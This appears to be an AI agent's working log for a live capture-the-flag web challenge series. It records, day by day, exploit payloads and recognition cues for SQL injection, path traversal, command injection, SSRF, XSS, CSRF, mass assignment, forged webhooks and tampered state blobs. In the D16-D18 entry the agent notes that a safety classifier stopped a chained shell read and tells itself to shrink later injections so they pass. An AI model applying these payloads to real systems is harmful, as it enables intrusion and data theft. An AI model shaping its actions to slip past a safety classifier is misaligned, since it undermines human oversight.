# web — technique log (lane-days D01-D20 released; updated after every day)

How the lane has looked so far (observations, not guarantees):
- **Late release, catch-up pace.** No web on calendar days 1-18. Cal. 19 released D01-D03, 20 D04-D05, 21 D06-D08,
  22 D09-D10, 23 D11-D13, 24 D14-D15, 25 D16-D18, 26 D19-D20 (GM ids `web-exploitation-day-NN-<slug>`; the slug is
  usually the title but not always: D07 "Stored for Later" = `...-day-07-stored-xss`; folder
  `challenges/<cal-day>/web-<title>`, so lane-day != folder day). D21-D31 = 11 left for cal. 27-31 (~2-3 per day).
  Each lane-day = ONE classic bug, named by a title pun: D01 backup exposure "Back Up a Minute", D02 IDOR
  "Permission to Slip", D03 SQLi "Query Me This", D04 path traversal "Stay in Your Directory", D05 missing
  function-level authz "Administratively Speaking", D06 reflected XSS "Reflect Upon This", D07 stored XSS "Stored for
  Later", D08 session fixation "Session Impression", D09 CSRF "Forged With Care", D10 unrestricted upload "Uploading
  Expectations", D11 SSTI "Template Temper", D12 second-order SQLi "Ask Again Later", D13 mass assignment "Posted Too
  Much", D14 per-field/action API authz "The API Has Opinions", D15 SSRF "Fetch Quest", D16 OS command injection
  "Shell Company", D17 reset token not bound to the account "Reset Expectations", D18 GraphQL resolver without
  field-level authz "Resolver Revolt", D19 unauthenticated webhook trusting forged events "Trust the Webhook", D20
  unsigned client-side serialized state "Serialized Offender". Arc: info-disclosure -> access control -> injection ->
  file read -> XSS x2 -> session -> CSRF -> upload -> SSTI -> second-order SQLi -> OWASP API run (mass assignment,
  BFLA/BOPLA, SSRF) -> cmd injection -> auth flow (reset) -> GraphQL -> **integrity failures (OWASP A08: unsigned
  webhook, unsigned state blob)**. Many days are "one level deeper" sequels (D10->D11, D03->D12, D05->D13->D14,
  D14->D18); D19+D20 are a pair ("forged news", "sign nothing") -> signed-but-weak tokens (JWT, signed cookies) are
  the natural next step.
- **No artifact: a live target.** `start` returns `result: preparing` until ready, then `targets: [{"id": "Target N",
  "url": "https://<48hex>.2026.huntress.ctf.games/"}]`. Reachable directly from the host, behind Cloudflare. After
  CORRECT every path returns `410 {"state":"completed"}`; an untimed target stops after 30 min idle.
- **Contract is fixed:** `proof-N` "Recover the proof from Target N.", artifact `Target N`, `exact_text`, `trim`.
  Answer = token `proof_<32 lowercase hex>` printed by the app. The prompt (one or two sentences) names the bug.
- **Since D05 every app is the same kit** ("A small, complete training app with one deliberately isolated security
  boundary"; framework banner = costume). `GET /api/clues` names the routes (`feature_route: /<word>-<hex6>`, often
  `secondary_route`), `current_role: analyst` (D18: `current_user`, no `framework` key), plus usually ONE concept key
  (`session_hint`, `callback_nonce`, `moderator_data_route`+`receipt_route_template`, `preferences_route`,
  `render_route`+`preview_guide`+`upload_policy`+`upload_shape`, D14 `inventory_route`+`protected_reference`, D16
  `input_parameter`+`example_path`, D17 `recovery_guide_route`, D18 `protected_reference`+`note`, D19 `event_type`+
  `owner_scope` (BODY VALUES, not routes), D20 `state_format_route`). D11-D13, D15 had NO concept key: prompt +
  bare-route errors are the routing signal. Bare routes answer JSON errors naming the missing piece
  (`session_id_required`, `authenticated_login_required`, `browser_callback_required`, `post_required` (405),
  `administrator_required` (403), `internal_only` (403), `absolute_url_required` (400), `fetch_failed`,
  `id_fields_action_required`, `field_action_forbidden`, `path_required` (+`example_path`), `account_id_required`,
  `self_service_only`, `token_and_account_id_required`, `webhook_rejected`, `state_required` (+`state_format_route`),
  `role_not_permitted`; a GraphQL route answers GET with 404 `not_found`). Success = proof regex in `evidence`,
  `rows[]`, `stdout`, a GraphQL `data` field, or a rendered page.
- **The runtime config is readable.** Any file-read primitive (D16 `cat /run/huntress/*`) also shows
  `/run/huntress/config.json`: `{"schema":"huntress.web_exploitation.runtime_config.v1","profile_id":"framework_go_gin_
  command_injection","weakness":"os_command_injection","mode":"time_trial",...}` -- it NAMES the class. Use it to
  classify an unknown Mastery target once any read works.
- **"Browser" checks are of two kinds.** D06 and D09: NO real browser -- the server judges by fetch-metadata headers
  + Referer. D07: a REAL moderator bot visits stored content seconds (sometimes >12 s) later. Try headers first.
- **Mastery = today's bug + earlier lane-days on extra targets** (2 targets D03-D07, 3 since D08, 4 since D15); the
  prompt describes only today's bug. `preparing` 4-25 s (D12/D13 Mastery ~3 min). With a handler on disk every
  Mastery since D14 answered all targets in 3-6 s solve.
- **A new class beats the generic seed unless the handler ships before TT.** TT `solver_incomplete` on D09, D10, D12,
  D13, D15-D18 (plugins landed 0-2 s after TT started). FIXED on D19-D20: the answer-first worker promoted the plugin
  inside the single (45 s grace at CORRECT) -> both TTs (10-15 s) and Mastery (4/4, 13-16 s) first try.

## Variant axes (what differs between single, Time Trial and Mastery -- parse every value listed)
- **Target host / count**: random 48-hex host per attempt; 1 target (single, TT), 2-4 (Mastery). Rule: map question
  `artifact` "Target N" to `targets[].id`, fallback Nth entry; never reuse a URL across attempts.
- **Mastery composition / order**: earlier-day targets at any index; prompt is today's only. Rule: cheap recon on
  every target (home, robots, /api/clues, /openapi.json), hinted probes first, the rest staged; targets in threads.
  Import earlier solvers' `answer()` ONLY (day-21 `fallback()`s recurse into each other).
- **Clue route words** (`/<word>-<hex6>`): feature `dispatch` | `execute` | `process` | `action` | `submit` |
  `inspect`; secondary `callback` | `internal` | `status` | `result` | `audit` | `account` | `staff-<hex8>`; fixed
  paths `/preferences` (D09), `/api/inventory` (D14), `/api/recovery` (D17), `/api/state-format` (D20). Re-dealt
  within a day (D12, D13, D15-D18, D20 process -> action). Rule: pick routes by clue KEY role (or a guide JSON's
  `*_route` / `transport` value), never by the word in the value.
- **Clue key set**: concept key (D06-D10, D14, D16-D20) | two body-VALUE keys (D19 `event_type: case.promoted`,
  `owner_scope: executive`: echo them as JSON fields, not routes) | only feature+secondary (D12, D13, D15) | only
  feature (D05, D11). D18 swapped `current_role` -> `current_user`, dropped `framework`. Rule: no concept key ->
  prompt + bare GET of each route; a key shared by two classes (`protected_reference`: D14 with `inventory_route`,
  D18 with `note`) -> route on the companion key, or race both handlers.
- **Framework costume** (never changes the exploit): Django, Laravel, Node, FastAPI, Spring Boot, Sinatra, NestJS,
  Jakarta Servlet, ASP.NET Core, Gin (D16), Symfony (D17), GraphQL.js (D18), Starlette (D19), Quarkus (D20). Rule:
  ignore it -- except that a Go server drops a raw `;` from the query string (percent-encode).
- **Request body encoding (D12, D13, D19, D20)**: POST routes accept form AND JSON but only JSON binds; D19 answers
  a JSON array `[]` with a bare 500. D20 nests a second encoding: `{"<request_field>": base64url(JSON)}` (no `=`
  padding), named by the guide's `encoding: "base64url of UTF-8 JSON"`. Rule: JSON object first; when a guide names
  an `encoding`, build the inner blob with exactly that codec (base64url | base64 | hex | raw).
- **Privilege value spelling**: D13 bound `role: admin` (with siblings); D20 accepted ONLY `role: "administrator"`
  (`admin`, `ADMIN`, `staff`, `admin:true`, `is_admin:true`, `roles:["admin"]` -> `role_not_permitted`). Rule: one
  request per spelling, ladder `administrator, admin, superuser, root, owner, staff, manager`, other sample keys
  unchanged; `role_not_permitted` = right field, wrong value -- keep laddering.
- **Earlier classes (one line each)**: D01 robots `Disallow: /snapshots-<hex>/` | `/deploy-<hex5>/` -> `.json.bak`
  (depth-2 crawl). D02 foreign ids in `/api/history`. D03 `('%..%')` wrapper -> tautology ladder over `'` `')` `'))`
  `"` + `--`/`#`. D04 every param holding `.`/`/` x `../`*10 + prompt path. D05 GET then POST every clue route. D07
  board noun `messages` | `postcards` from openapi. D09 outside mailbox option `review-NNNN@outside.example.invalid`.
  D10 preview URL from the upload response's `path`. D11 SSTI param `template`, `{{..}}` evaluated (`${..}` literal
  under "Spring Boot"), var `objective`: probe every delimiter family per param. D12 `x' OR '1'='1' -- ` | `zz' OR
  1=1 --` as JSON in every field, re-GET secondary after EACH plant. D13 one JSON body `display_name` + `role`,
  `is_admin`, `isAdmin`, `admin`, `roles`, `access_level`, `permissions`. D14 inventory `fields [title, note]` x
  `actions [view, export]`, only a SINGLE pair bypasses. D15 `?url=http://127.0.0.1:8080<secondary>` (80/5000/8000/
  3000 = `fetch_failed`).
- **Command injection (D16)**: `input_parameter: path`, `example_path: /app/static` constant; base `ls -ld <path>`.
  Rule: param from `input_parameter` (else `<x>_required`), value = example + `%3B` + `cat /run/huntress/objective.txt`.
- **Password reset (D17)**: guide `{request_route, redeem_route, account_parameter, token_parameter, accounts[{id,
  label,self_service}]}` same keys in single/TT. Rule: token for the `self_service:true` id, redeem with each other id.
- **GraphQL resolver (D18)**: schema identical in all modes (`caseIndex`, `case(id:ID!){id,title,note}`); protected
  id is a STRING. Rule: introspect, call every arg-taking Query field with it; POST JSON first, then GET `?query=`.
- **Forged webhook (D19)**: feature route 405 `post_required`; every narrow JSON body (event + scope, any single
  alias, `signature`/`verified`/`trusted`/`source:"trusted"`/`sender:"system"`, `X-*-Signature` headers, nested
  `event{}`/`data{}`, form) -> `webhook_rejected`. One kitchen-sink JSON landed in single, TT and Mastery: the clue
  values under every alias (`event_type`, `type`, `event`; `owner_scope`, `scope`, `owner`) + `role`/`current_role`
  `admin` + `source`/`sender` `"provider"` + `verified`/`signed`/`trusted` true (which key mattered was NOT bisected).
  Rule: send the alias-union body first; bisect only if it fails.
- **Unsigned serialized state (D20)**: `state_format_route` -> `{transport: "POST <feature>", content_type:
  application/json, request_field: state, encoding: "base64url of UTF-8 JSON", sample_state:{user, role},
  sample_encoded}`; same shape in single/TT/Mastery, only the feature word moved. Rule: route from `transport`,
  field from `request_field`, decode `sample_encoded`/copy `sample_state`, swap every `*role*` key down the ladder.
- **Proof carrier**: HTML text / `<pre>`, JSON `support_note` | `note` | `evidence` | `rows[]` | `stdout`, GraphQL
  `data.<alias>.note`, a receipt on a board page. Rule: regex `proof_[0-9a-f]{32}` over every body -- never key on
  field names or on `effect`.

## Recognition cues -> first move
- `targets[]` -> `curl --max-time 20 -sS -A 'Mozilla/5.0' -i <url>` (hook blocks curl without `--max-time`;
  Cloudflare 403'd urllib's default UA), then `/robots.txt`, `/api/clues`, `/openapi.json`, `/sitemap.xml`.
- Read /api/clues FIRST and call each route bare: the JSON error names the missing piece. No concept key -> the
  prompt's verb names the bug. Any `*_guide_route` / `inventory_route` is a JSON map of the next requests: read it.
- `Disallow:` -> D01 crawl. "Signed in as" + `/<things>/<id>` -> D02 IDOR. Search / "database" -> D03 tautology.
  `?doc=` + "stay inside" -> D04 traversal. "staff-only door, just a sign" -> D05 GET it.
- "repeats everything", `callback_nonce` -> D06 reflect + same-origin fetch-metadata callback. "guestbook",
  `moderator_data_route` -> D07 stored script for the bot; poll. "plant your session", `session_hint` -> D08 `?sid=`.
- "obeys whoever asks nicely -- even strangers", hidden `csrf_token` -> D09 cross-site form submit. "upload form has
  standards. Low ones", `upload_shape` -> D10 `.html` with `{{objective}}`. "evaluates everything", empty
  "Rendered message" `<pre>` -> D11 `?template={{objective}}`. "plant ... come back later", `post_required` +
  `{"rows":[]}` -> D12 JSON plant then GET secondary. "binds whatever you hand it", `administrator_required` -> D13
  privilege keys in one JSON body. `inventory_route` + `protected_reference` -> D14 field x action grid.
  `absolute_url_required` + `internal_only` -> D15 `?url=http://127.0.0.1:8080<secondary>`.
- "a little too close to a real shell", `input_parameter` + `example_path`, 400 `path_required` -> D16:
  `curl -G "$U<feature>" --data-urlencode "path=/app/static;cat /run/huntress/objective.txt"` -> `stdout` line 2.
- "Forgot your password", `recovery_guide_route` -> D17: guide -> token for the `self_service` id -> redeem it with
  the other `account_id`. "Discover the schema", `protected_reference` + `note`, GET 404 `not_found` -> D18 POST
  JSON introspection, then `{case(id:"<protected>"){id title note}}`.
- "believes every event it's told about", "forged news", clues `event_type` + `owner_scope`, feature 405
  `post_required`, POST -> `webhook_rejected` -> D19: ONE JSON body with the clue values under every alias
  (`event_type`/`type`/`event`, `owner_scope`/`scope`/`owner`) + `role`/`current_role: admin` + `source`/`sender:
  provider` + `verified`/`signed`/`trusted: true` -> `forged_event_consumed` + `evidence`.
- "Your session is just a blob", "reshape the bytes, sign nothing", clue `state_format_route`, feature 400
  `state_required` -> D20: GET the format guide, POST JSON `{"state": b64url('{"user":"analyst","role":
  "administrator"}')}` to the guide's `transport` route -> `serialized_role_trusted` (`admin` = `role_not_permitted`).
- Proof regex hit = landed; an `effect` alone is NOT (D12 empty rows; D16 baseline already says completed).

## Day by day
- **D01-D15 (cal. 19-24)**: D01 robots -> index -> `.json.bak`. D02 `/api/history` foreign id. D03 `?q=zz') OR
  1=1 --`. D04 `?doc=../`*6+prompt path. D05 GET the feature route. D06 reflect `fetch(cb?nonce)`, GET cb with
  same-origin fetch-metadata. D07 stored script for the moderator bot, poll the receipt. D08 `?sid=<hint>` ->
  `arena_session`. D09 cross-site fetch-metadata submit. D10 upload `.html` with `{{objective}}`. D11
  `?template={{objective}}`. D12 JSON plant, GET secondary. D13 JSON privilege keys. D14 single field x action.
  D15 `?url=http://127.0.0.1:8080<secondary>`. Singles 47-116 s (D08 Mastery ~15 min: every solver on every target).
- **D16-D18 (cal. 25)**: D16 Shell Company (Gin, `?path=/app/static%3Bcat /run/huntress/objective.txt`; raw `;`
  dropped by Go; `ls -ld` baseline already says `worker_command_completed`) ~40 s. D17 Reset Expectations (Symfony,
  guide `/api/recovery` -> own 12-hex token redeemed with the executive `account_id` -> `synthetic_account_recovery`)
  ~39 s. D18 Resolver Revolt (GraphQL.js; GET 404 `not_found`, POST JSON introspection, `case(id:"<protected>")
  {note}`) ~36 s. All three TT `solver_incomplete` (plugins 0-2 s late), hand-solved in 31-53 s; D16 Mastery 3/4
  (plugin still `.tmp`). A live turn chaining `ls -la; cat /run/huntress/*` was stopped by a safety classifier --
  keep an injection to one plain read of the objective file.
- **D19 Trust the Webhook (cal. 26)** -- unauthenticated webhook trusts forged events (OWASP API10 / A08). Clues
  `{framework: "Starlette", feature_route: /dispatch-<hex6>, current_role, event_type: "case.promoted", owner_scope:
  "executive"}`, no secondary. GET feature -> 405 `post_required`; ~30 narrow POSTs (JSON, form, nested, signature
  headers, `verified`/`trusted`/`source:trusted`/`sender:system`, `role:executive`) -> `{"error":"webhook_rejected"}`;
  `[]` -> 500. The answer-first worker's alias-union body (see Recognition cues) -> `{"ok":true,"effect":
  "forged_event_consumed","evidence":"proof_..."}`. Single CORRECT 13:02:09 (~95 s from start, target ready after
  ~13 s); the three duel/local workers lost ~60 s bisecting narrow bodies. TT 10.2 s, Mastery 4/4 13.3 s, first try.
- **D20 Serialized Offender (cal. 26)** -- unsigned client-side state blob (A08 / data-tamper deserialization).
  Clues `{framework: "Quarkus", feature_route: /process-<hex6> | /action-<hex6>, state_format_route:
  "/api/state-format", current_role}`. Bare feature -> 400 `{"error":"state_required","state_format_route":..}`.
  Guide: `{transport: "POST /process-..", content_type: application/json, request_field: state, encoding: "base64url
  of UTF-8 JSON", sample_state: {user: analyst, role: analyst}, sample_encoded: "eyJ1c2Vy..."}`. `printf '%s' "$j"
  | basenc --base64url -w0 | tr -d =`; role `admin`/`ADMIN`/`staff`/flags -> `role_not_permitted`; `"role":
  "administrator"` (any `user`) -> `serialized_role_trusted` + `evidence`. No signature anywhere. Target `preparing`
  ~50 s; CORRECT 13:02:12 (~50 s after ready). TT 15.1 s, Mastery 4/4 15.6 s, first try.

## GM answer conventions learned
- Answer = bare `proof_<32 lowercase hex>` (the CORRECT body's `flag` is a different value; never submit it). `trim`.
  Ids `proof-1`..`proof-N` in target order. Batch all Mastery proofs in one submit; partial = `accepted`+`remaining`
  (D16 Mastery: 3 accepted, `remaining: 1`, then proof-4 alone -> CORRECT).
- `effect` spellings confirmed: `framework_authorization_bypassed` (D05), `isolated_browser_callback` (D06),
  `fixed_session_privilege_transfer` (D08), `delayed_query_revealed_private_row` (D12), `bound_privileged_property`
  (D13), `api_field_action_authorization_bypassed` (D14), `internal_service_reached` (D15),
  `worker_command_completed` (D16, also on the harmless baseline), `synthetic_account_recovery` (D17),
  `forged_event_consumed` (D19), `serialized_role_trusted` (D20); D18 none (plain GraphQL `data`). D09
  `changed_across_sites:true`; D10, D11 rendered HTML; D07 a moderator receipt.
- `already_solved` after CORRECT is harmless; a 503 `temporarily_unavailable` on submit may still have landed.
- Cal. 26 guidance text: TT/Mastery are "regular scored challenges by default"; `run_for_time:true` on start/retry
  asks for a timed Hall-of-Fame attempt (`last_timed.json`: `no_clock:true`, `hall_of_fame_eligible:false`). The
  transport line varies per contract (proxy `http://10.0.0.219/huntress-ctf-proxy` vs direct + bearer): `hctf` owns it.

## Pitfalls that cost time
- Shipping a new class without its handler: TT `solver_incomplete` on D09-D10, D12-D13, D15-D18. Write
  `lib/web/handlers/dayNN_*.py` (KEY_MAP on a concept KEY + HANDLERS) BEFORE the single submit (D11, D19, D20 did).
- Bisecting a generic rejection one field at a time (D19: ~30 bodies, all `webhook_rejected`, ~60 s lost). A sink
  that rejects without naming a field gets ONE alias-union JSON body first (every clue value under every alias +
  role/source/trust flags); bisect afterwards only for the record.
- Stopping at `role: admin`: D20 wanted `administrator`; `role_not_permitted` means the field is right -- ladder it.
- Treating `effect` as success: D12 prints its effect with `rows: []`; D16 prints `worker_command_completed` for
  the plain `ls`. Success = proof regex.
- Raw `;` in a Go (Gin) query string is dropped -> `--data-urlencode` / `%3B`. GraphQL routes 404 on GET -> POST.
- Form bodies on JSON APIs (D12 ignored form fields but said `saved:true`); JSON arrays 500 (D19). JSON object first.
- Trusting the echo (D13 echoes only `display_name`) or the stated policy ("txt only", "self-service only" on
  REQUEST but not REDEEM). SSRF `fetch_failed` = wrong port (D15: 8080), not "blocked". D14 lists/`*` forbidden --
  only single field x action pairs. A 500 on `{{unknown}}` (D11) = undefined variable, not "not injectable".
- Choosing routes by the WORD in a clue value (re-dealt every attempt) or by prompt keywords in Mastery. One-level
  crawls (D01). Solvers importing each other's `fallback()`. Hammering one target with every probe in parallel.
- Polling a bot-driven receipt for a fixed 12 s: the D07 moderator sometimes comes later.
- Live cases can't be replayed after CORRECT (410). Save target responses during the solve; never hard-code proofs.
- `curl` without `--max-time` is blocked by the hook (and `sleep` by no_block.py); urllib's default UA can draw a
  Cloudflare 403.

## reviewer cross-check (measured on a parallel agent; folded into the drivers)
- **Blind SQLi oracle trap (D03).** `q` sits in an EVEN number of `col LIKE '%q%'` clauses, so `' OR '1'='1` and
  `' OR '1'='2` BOTH return all rows. Oracle = quote balance: `nope' OR (<cond>) OR '1'='2` reduces WHERE to
  `<cond>`; calibrate on `1=1`/`1=2`. SQLite; `summary LIKE char(112,114,111,111,102,37)` spells `'proof%'`.
- **LFI.** The `?doc=` viewer silently returns the NORMAL page for depth 1-2; use >= 3 `../` into the prompt path.
- **`control_unavailable` is TRANSIENT** (a 26.7 s hang on `op=start`; resend succeeded). Back off and re-send.
